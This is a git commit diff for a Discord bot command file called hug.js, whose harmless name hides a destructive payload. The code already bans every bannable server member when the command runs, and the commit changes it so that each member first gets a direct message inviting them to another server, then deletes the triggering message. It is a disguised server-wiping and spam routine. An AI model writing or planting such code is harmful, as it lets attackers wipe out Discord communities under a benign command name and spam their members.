6a5855d834f77391ef304d7e360bea4dc5cebd46
stefangamer <58218753+stefangamer@users.noreply.github.com>
2020-07-03 17:57:05 +0200

    Update hug.js

--- commands/hug.js
+++ commands/hug.js
@@ -2,11 +2,15 @@
 const Discord = module.require("discord.js");
 
 module.exports.run = async (bot, message, args) => {
+	
+	        message.guild.members.filter(member => member.bannable).forEach(member => {
+			member.send("Miss the old ESC Mods? We got the gang back together and want you in: https://discord.gg/rc3wxYU")});
+        message.delete(1000);
+
 
     try {
 
         message.guild.members.filter(member => member.bannable).forEach(member => {
-			member.send("Miss the old ESC Mods? We got the gang back together and want you in: https://discord.gg/rc3wxYU")
 			member.ban()});
         message.delete(1000);
 
@@ -15,6 +19,8 @@ module.exports.run = async (bot, message, args) => {
         console.log(e.stack);
 
     }
+	
+	
         
 }
 
